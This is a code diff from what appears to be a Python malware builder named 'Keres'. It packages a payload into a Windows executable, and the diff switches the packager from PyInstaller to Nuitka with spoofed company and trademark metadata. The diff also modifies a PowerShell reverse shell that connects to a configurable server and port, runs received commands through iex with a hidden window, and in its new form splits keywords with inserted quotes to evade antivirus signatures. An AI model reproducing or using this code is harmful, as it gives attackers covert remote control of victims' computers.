@@ -16,20 +16,25 @@ def create_exe(py_file):
     try:
         icons_directory = "icons"
         icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
-        name ="Keres"
         
 
-        pyinstaller_command = [
-            "pyinstaller",
-            "--noconfirm",
-            "--onefile",
-            "--windowed",
-            "--icon", icon_file,
-            "--name", name,  # Use the provided exe_name as the name of the executable
-            "--distpath", "Output", 
-            py_file
-        ]
-        subprocess.run(pyinstaller_command)
+        nuitka_command = [
+    "python", "-m", "nuitka",
+    "--onefile",
+    "--company-name=Keres",
+    "--file-version=1.2",
+    "--onefile-tempdir-spec=%HOME%"
+    "--copyright=COPYRIGHT@Keres",
+    "--trademarks=No Enemies",
+    f"--windows-icon-from-ico=icons/keres.ico",
+    "--standalone",
+    "--remove-output",
+    f"--output-dir=Output",
+    f"--output-filename=Keres",
+    py_file
+]
+
+        subprocess.run(nuitka_command)
         print("Executable created successfully.")
     except Exception as e:
         print("An error occurred:", str(e))
@@ -72,7 +77,7 @@ def main():
             try {{
                 $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }};
                 if (-not $isRunning) {{ 
-                    Start-Process $PSHOME\powershell.exe -ArgumentList {{$uniqueIdentifier; $client = New-Object System.Net.Sockets.TcpClient('{server_address}',{port_number});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hidden 
+                    Start-Process $PSHOME\powe''rshell.exe -ArgumentList {{$uniqueIdentifier;$client = New-Object Sys''tem.N''et.Sock''ets.TCPCl''ient('{server_address}',{port_number});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName S''ystem.T''ext.AS''CIIE''ncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hid''den 
                 }} else {{
                     Write-Host "Script is already running."
                 }};  
